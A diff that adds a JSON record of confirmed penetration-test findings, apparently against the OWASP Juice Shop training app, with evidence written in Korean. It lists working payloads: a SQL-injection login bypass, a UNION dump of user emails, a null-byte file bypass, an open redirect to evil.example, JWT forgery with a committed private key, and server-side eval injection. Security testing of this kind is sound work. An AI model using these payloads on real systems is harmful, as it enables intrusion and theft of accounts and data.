@@ -1,0 +1,56 @@
+{
+  "F032": {
+    "status": "CONFIRMED",
+    "http": 200,
+    "evidence": "인증 우회 성공 — admin@juice-sh.op 토큰 발급",
+    "payload": "POST /rest/user/login {\"email\":\"' OR 1=1--\"}"
+  },
+  "F035": {
+    "status": "CONFIRMED",
+    "http": 200,
+    "evidence": "union 주입으로 Users 테이블에서 24개 이메일 행 탈취",
+    "payload": "GET /rest/products/search?q=... UNION SELECT ... FROM Users--"
+  },
+  "F029": {
+    "status": "CONFIRMED",
+    "http": 200,
+    "evidence": "null-byte 우회로 /ftp/package.json.bak%2500.md 획득 (4261 bytes)",
+    "payload": "GET /ftp/package.json.bak%2500.md"
+  },
+  "F034": {
+    "status": "CONFIRMED",
+    "http": 302,
+    "evidence": "공격자 URL로 302 리다이렉트: https://evil.example/?x=https://github.com/juice-shop/juice-shop",
+    "payload": "GET /redirect?to=https://evil.example/?x=<allowlisted>"
+  },
+  "F038": {
+    "status": "CONFIRMED",
+    "http": 200,
+    "evidence": "/ftp/ 디렉터리 리스팅 노출 (14개 항목)",
+    "payload": "GET /ftp/"
+  },
+  "F040": {
+    "status": "CONFIRMED",
+    "http": 200,
+    "evidence": "/encryptionkeys/ 디렉터리 리스팅 노출 (4개 항목)",
+    "payload": "GET /encryptionkeys/"
+  },
+  "F041": {
+    "status": "CONFIRMED",
+    "http": 200,
+    "evidence": "/support/logs/ 디렉터리 리스팅 노출 (5개 항목)",
+    "payload": "GET /support/logs/"
+  },
+  "F028": {
+    "status": "CONFIRMED",
+    "http": 200,
+    "evidence": "위조 RS256 토큰 수락(HTTP 200, 전체 사용자 목록 반환), 쓰레기 토큰은 401 — 커밋된 개인키로 완전 인증 우회",
+    "payload": "sign JWT with in-repo RSA key → GET /api/Users (Authorization: Bearer <forged>)"
+  },
+  "F036": {
+    "status": "CONFIRMED",
+    "http": 200,
+    "evidence": "eval이 공격자 표현식 실행 — 프로필에 #{99999*7} 결과 699993 렌더링",
+    "payload": "POST /profile username=#{99999*7} → GET /profile (server-side eval)"
+  }
+}
